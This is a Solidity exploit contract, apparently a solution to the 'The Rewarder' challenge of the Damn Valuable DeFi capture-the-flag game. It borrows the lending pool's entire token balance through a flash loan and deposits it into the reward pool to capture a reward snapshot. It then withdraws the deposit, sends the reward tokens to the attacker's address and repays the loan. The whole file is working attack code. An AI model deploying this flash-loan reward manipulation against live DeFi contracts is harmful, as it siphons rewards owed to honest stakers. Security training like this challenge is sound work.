// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "hardhat/console.sol";

contract RewarderExploit {
    DamnValuableToken token;
    RewardToken rewardToken;
    FlashLoanerPool loanPool;
    TheRewarderPool rewardPool;
    address attacker;


    constructor(address _rewardPool, address _loanPool) {
        rewardPool = TheRewarderPool(_rewardPool);
        loanPool = FlashLoanerPool(_loanPool);
        token = loanPool.liquidityToken();
        rewardToken = rewardPool.rewardToken();
    }

    function attack() public {
        attacker = msg.sender;
        uint256 amount = token.balanceOf(address(loanPool));
        loanPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 _amount) external {
        // received DVT flash loan, deposit into rewardPool
        // 1. deposit
        // 2. distributeRewards
        // 3. receive rewards
        // 4. withdraw
        // 5. transfer reward token to msgsender
        // 6. return flashloan
        token.approve(address(rewardPool), _amount);
        rewardPool.deposit(_amount);

        rewardPool.withdraw(_amount);
        
        uint256 rewardsAmount = rewardToken.balanceOf(address(this));
        rewardToken.transfer(attacker, rewardsAmount);
        token.transfer(address(loanPool), _amount);
    }
}